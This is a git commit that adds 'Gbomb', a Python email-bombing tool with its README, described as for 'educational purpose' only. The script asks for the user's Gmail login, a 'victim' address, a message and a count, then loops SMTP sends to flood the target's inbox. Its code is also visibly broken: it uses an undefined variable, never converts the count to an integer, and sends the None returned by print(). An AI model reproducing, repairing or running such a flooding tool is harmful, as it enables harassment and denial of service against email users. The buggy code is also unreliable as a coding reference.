d48d6192dcdf825f51e4d7c22be976a3939d035e
Md. Nur habib <68025241+thenurhabib@users.noreply.github.com>
2021-12-25 04:24:34 +0600

    Add files via upload

---
+++ README.md
@@ -0,0 +1,34 @@
+
+# Gbomb
+
+Gmail Bombing Tool. This tool made for only educational purpose.
+
+### Usage
+`apt-get update` <br>
+`apt-get upgrade` <br>
+`pkg install git` <br>
+`pkg install python3` <br>
+`git clone https://github.com/nurhabib1/gbomb` <br>
+`cd gbomb` <br>
+`.python3 gbomb.py` 
+
+
+
+## Screenshot
+
+![App Screenshot](./screenshot.png)
+
+
+## 🔗 Links
+[![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://www.nurhabib.ml/)
+[![twitter](https://img.shields.io/badge/twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/mdnurhabib12)
+
+
+## 🚀 About Me
+I'm a programmer & Linux System Administrator.
+
+
+## Author
+
+- [@Md. Nur habib](https://www.github.com/nurhabib1)
+
---
+++ gbomb.py
@@ -0,0 +1,87 @@
+# Import some required modules
+import os
+import sys
+import smtplib
+from time import sleep
+from colorama import Fore
+from getpass import getpass
+
+# Banner Function
+def banner():
+    print(
+        Fore.GREEN
+        + """
+          _____ _                     _     
+         / ____| |                   | |    
+        | |  __| |__   ___  _ __ ___ | |__  
+        | | |_ | '_ \ / _ \| '_ ` _ \| '_ \ 
+        | |__| | |_) | (_) | | | | | | |_) |
+     v1.0\_____|_.__/ \___/|_| |_| |_|_.__/ 
+    """
+    )
+    print(
+        Fore.BLUE
+        + """
+      Name       : Gbomb - Gmail Bombing Tool.
+      Author     : Md. nur habib
+      Email      : mdnurhabib12@Gmail.com
+      GitHub     : github.com/thenurhabib
+      HackerRank : hackerrank.com/thenurhabib\n      
+        """
+    )
+
+
+#Call Banner Function
+banner()
+
+# login information (Username & Password)
+loginCredentials = ["habib$username", "habib$password"]
+# Get login information from user
+print(Fore.WHITE + "Before Using This Tool You Have To Login First.")
+getLoginUsername = input("Enter Username :  ")
+getLoginPassword = getpass("Enter Password : ")
+
+# Check Username and Password validation
+if getLoginUsername == loginCredentials[0] and getLoginPassword == loginCredentials[1]:
+    os.system("clear")
+    print("\nLogin Succesfull.\nLoading Please Wait...")
+
+    # Get Some Mail Bomping Information
+    getGmailUser = input(Fore.MAGENTA + "Enter Your Gmail : ")
+    getGmailPassword = getpass("Enter Your Gmail Password : ")
+    getVictimeMailAddress = input(" Enter victime Mail Address : ")
+    getTextmessagetoSend = input("Enter Your Text Message : ")
+    howManyMail = input("How Many Mail/Mails You Want to Send : ")
+    print("\nSending, Please Wait...")
+    sleep(2)
+    SmtpServer = "smtp.gmail.com"
+    gmailServerPort = 587
+    # Send Mails
+    try:
+        server = smtplib.SMTP(SmtpServer, gmailServerPort)
+        server.ehlo()
+        if SmtpServer == "smtp.gmail.com":
+            server.starttls()
+        server.login(getGmailUser, getGmailPassword)
+        for i in range(1, howManyMail + 1):
+            subject = os.urandom(9)
+            messageForBomb = print(
+                f"From {user} \nSubject {subject} \n {getTextmessagetoSend}"
+            )
+            server.sendmail(user, getVictimeMailAddress, messageForBomb)
+            print("Email SENT  : %i") % i
+            sys.stdout.flush()
+        server.quit()
+        print(f"{howManyMail} Mails are Sent Successfully.")
+
+    except KeyboardInterrupt:
+        print("Canceled")
+        sys.exit()
+    except smtplib.SMTPAuthenticationError:
+        print(
+            "The Username or Password You Entered is Incorrect. Please Check it and Try Again."
+        )
+        sys.exit()
+#If Password or Username Wrong.
+else:
+    print(Fore.RED + "Wrong Login Information. Please Try Again.")
